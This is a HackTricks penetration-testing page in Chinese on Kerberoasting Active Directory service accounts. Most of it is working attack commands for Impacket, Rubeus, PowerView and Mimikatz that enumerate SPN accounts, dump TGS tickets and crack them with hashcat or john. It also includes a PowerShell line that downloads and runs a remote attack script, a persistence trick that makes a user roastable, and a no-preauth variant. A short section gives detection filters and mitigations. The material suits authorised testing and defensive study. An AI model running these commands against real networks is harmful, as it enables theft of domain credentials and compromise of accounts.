# Kerberoast

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
使用 [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) 轻松构建和 **自动化工作流程**，由世界上 **最先进** 的社区工具提供支持。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}

{% hint style="success" %}
学习和实践 AWS 渗透测试：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
学习和实践 GCP 渗透测试： <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **在 Twitter 上关注** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 来分享黑客技巧。

</details>
{% endhint %}

## Kerberoast

Kerberoasting 关注于获取 **TGS 票证**，特别是与 **Active Directory (AD)** 中 **用户账户** 相关的服务，排除 **计算机账户**。这些票证的加密使用源自 **用户密码** 的密钥，从而允许 **离线凭证破解** 的可能性。使用用户账户作为服务的标志是 **"ServicePrincipalName"** 属性非空。

执行 **Kerberoasting** 需要一个能够请求 **TGS 票证** 的域账户；然而，这一过程并不需要 **特殊权限**，使得任何拥有 **有效域凭证** 的人都可以访问。

### 关键点：

* **Kerberoasting** 以 **AD** 中的 **用户账户服务** 为目标 **TGS 票证**。
* 使用 **用户密码** 密钥加密的票证可以 **离线破解**。
* 服务通过 **ServicePrincipalName** 的非空值来识别。
* **不需要特殊权限**，只需 **有效域凭证**。

### **攻击**

{% hint style="warning" %}
**Kerberoasting 工具** 通常在执行攻击和发起 TGS-REQ 请求时请求 **`RC4 加密`**。这是因为 **RC4 是** [**较弱的**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795)，并且比其他加密算法（如 AES-128 和 AES-256）更容易使用 Hashcat 等工具进行离线破解。\
RC4（类型 23）哈希以 **`$krb5tgs$23$*`** 开头，而 AES-256（类型 18）以 **`$krb5tgs$18$*`** 开头。`
{% endhint %}

#### **Linux**
```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
```
多功能工具，包括可进行kerberoast的用户转储：
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```
#### Windows

* **枚举可Kerberoast的用户**
```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```
* **技术 1：请求 TGS 并从内存中转储**
```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
* **技术 2：自动化工具**
```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
{% hint style="warning" %}
当请求 TGS 时，Windows 事件 `4769 - A Kerberos service ticket was requested` 被生成。
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
使用 [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) 轻松构建和 **自动化工作流程**，由世界上 **最先进** 的社区工具提供支持。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}

### 破解
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### 持久性

如果你对一个用户拥有**足够的权限**，你可以**使其可进行kerberoast**：
```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```
您可以在这里找到用于 **kerberoast** 攻击的有用 **工具**: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

如果您在 Linux 中发现此 **错误**: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`**，这可能是由于您的本地时间，您需要将主机与 DC 同步。有几个选项：

* `ntpdate <IP of DC>` - 自 Ubuntu 16.04 起已弃用
* `rdate -n <IP of DC>`

### 缓解措施

如果可利用，Kerberoasting 可以以高度隐蔽的方式进行。为了检测此活动，应关注 **安全事件 ID 4769**，该事件表示请求了 Kerberos 票证。然而，由于此事件的高频率，必须应用特定过滤器以隔离可疑活动：

* 服务名称不应为 **krbtgt**，因为这是正常请求。
* 以 **$** 结尾的服务名称应被排除，以避免包括用于服务的机器帐户。
* 应通过排除格式为 **machine@domain** 的帐户名称来过滤来自机器的请求。
* 仅应考虑成功的票证请求，通过失败代码 **'0x0'** 识别。
* **最重要的是**，票证加密类型应为 **0x17**，这通常在 Kerberoasting 攻击中使用。
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
为了降低Kerberoasting的风险：

* 确保**服务账户密码难以猜测**，建议长度超过**25个字符**。
* 利用**托管服务账户**，提供如**自动密码更改**和**委派服务主体名称（SPN）管理**等好处，增强对这种攻击的安全性。

通过实施这些措施，组织可以显著降低与Kerberoasting相关的风险。

## Kerberoast w/o domain account

在**2022年9月**，一位名为Charlie Clark的研究人员揭示了一种新的系统利用方式，通过他的平台[exploit.ph](https://exploit.ph/)分享。这种方法允许通过**KRB\_AS\_REQ**请求获取**服务票据（ST）**，而令人惊讶的是，这并不需要对任何Active Directory账户的控制。基本上，如果一个主体的设置不需要预身份验证——这种情况类似于网络安全领域所称的**AS-REP Roasting攻击**——则可以利用这一特性来操纵请求过程。具体而言，通过更改请求主体中的**sname**属性，系统被欺骗发出**ST**而不是标准的加密票据授予票据（TGT）。

该技术在这篇文章中有详细解释：[Semperis博客文章](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)。

{% hint style="warning" %}
您必须提供用户列表，因为我们没有有效的账户来使用此技术查询LDAP。
{% endhint %}

#### Linux

* [impacket/GetUserSPNs.py from PR #1413](https://github.com/fortra/impacket/pull/1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```
#### Windows

* [GhostPack/Rubeus from PR #139](https://github.com/GhostPack/Rubeus/pull/139):
```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```
## References

* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)

{% hint style="success" %}
学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **在** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** 上关注我们。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 来分享黑客技巧。

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
使用 [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) 轻松构建和 **自动化工作流程**，由世界上 **最先进** 的社区工具提供支持。\
今天就获取访问权限：

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}
